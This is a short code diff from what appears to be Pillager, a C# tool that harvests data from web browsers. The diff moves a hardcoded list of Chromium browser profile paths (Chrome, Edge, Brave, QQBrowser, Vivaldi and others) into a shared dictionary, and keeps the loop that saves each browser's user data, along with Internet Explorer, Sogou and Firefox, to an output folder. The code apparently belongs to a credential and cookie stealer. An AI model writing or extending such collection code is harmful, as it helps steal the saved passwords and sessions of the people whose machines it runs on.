@@ -30,25 +30,12 @@ namespace Pillager
             //Browsers
             IE.Save(savepath);
             OldSogou.Save(savepath);//SogouExplorer < 12.x
-            FireFox.Save(savepath);
-            List<List<string>> browserOnChromium = new List<List<string>>()
-            {
-                new List<string>() { "Chrome", "Google\\Chrome\\User Data" } ,
-                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
-                new List<string>() { "Chromium", "Chromium\\User Data" } ,
-                new List<string>() { "Edge", "Microsoft\\Edge\\User Data" } ,
-                new List<string>() { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
-                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
-                new List<string>() { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
-                new List<string>() { "Vivaldi", "Vivaldi\\User Data" } ,
-                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data" } 
-                //new List<string>() { "", "" } ,
-            };
-            foreach (List<string> browser in browserOnChromium)
+            FireFox.Save(savepath);           
+            foreach (var browser in Chrome.browserOnChromium)
             {
                 string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                browser[1]);
-                Chrome chrome = new Chrome(browser[0], chromepath);
+                browser.Value);
+                Chrome chrome = new Chrome(browser.Key, chromepath);
                 chrome.Save(savepath);                
             }
 
